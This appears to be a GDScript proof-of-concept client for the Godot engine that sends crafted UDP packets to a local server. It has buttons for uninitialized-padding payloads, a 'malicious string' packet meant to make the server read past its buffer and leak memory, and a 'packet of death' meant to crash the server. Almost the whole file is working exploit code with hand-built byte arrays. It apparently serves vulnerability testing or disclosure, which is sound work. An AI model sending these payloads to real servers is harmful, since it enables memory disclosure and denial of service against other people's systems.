extends Node

var udp = PacketPeerUDP.new()

func _ready():
	udp.set_dest_address("127.0.0.1", 1025)


func _process(delta):
	while udp.get_available_packet_count() > 0:
		# Setup output of received data
		var node = get_node("Panel/MarginContainer/VBoxContainer/RichTextLabel")
		var text = node.get_text()
		
		# Read received packet
		var received_packet = udp.get_var()
		
		# Output received data to console and UI
		print("Server says: '" + received_packet + "'")
		node.set_text(text + "Server says: '" + received_packet + "'\n")


func _on_SendUninitializedStringDataButton_pressed():
	# Send a string that has uninitialized padded data in it
	udp.put_var(PoolStringArray(['test1234test1']))


func _on_SendUnintializedPoolArrayDataButton_pressed():
	# Send a pool byte array that has uninitialized padded data in it
	udp.put_var(PoolByteArray([1, 2, 3, 4, 1, 2, 3, 4, 1]))


func _on_SendMaliciousStringDataButton_pressed():
	# Try to read data that still exists in memory until it is null terminated
	udp.put_packet(PoolByteArray([23, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 255]))


func _on_SendPacketOfDeathButton_pressed():
	# Send a packet of death to crash the server
	udp.put_packet(PoolByteArray([20, 0, 0, 0, 0, 0, 0, 255]))
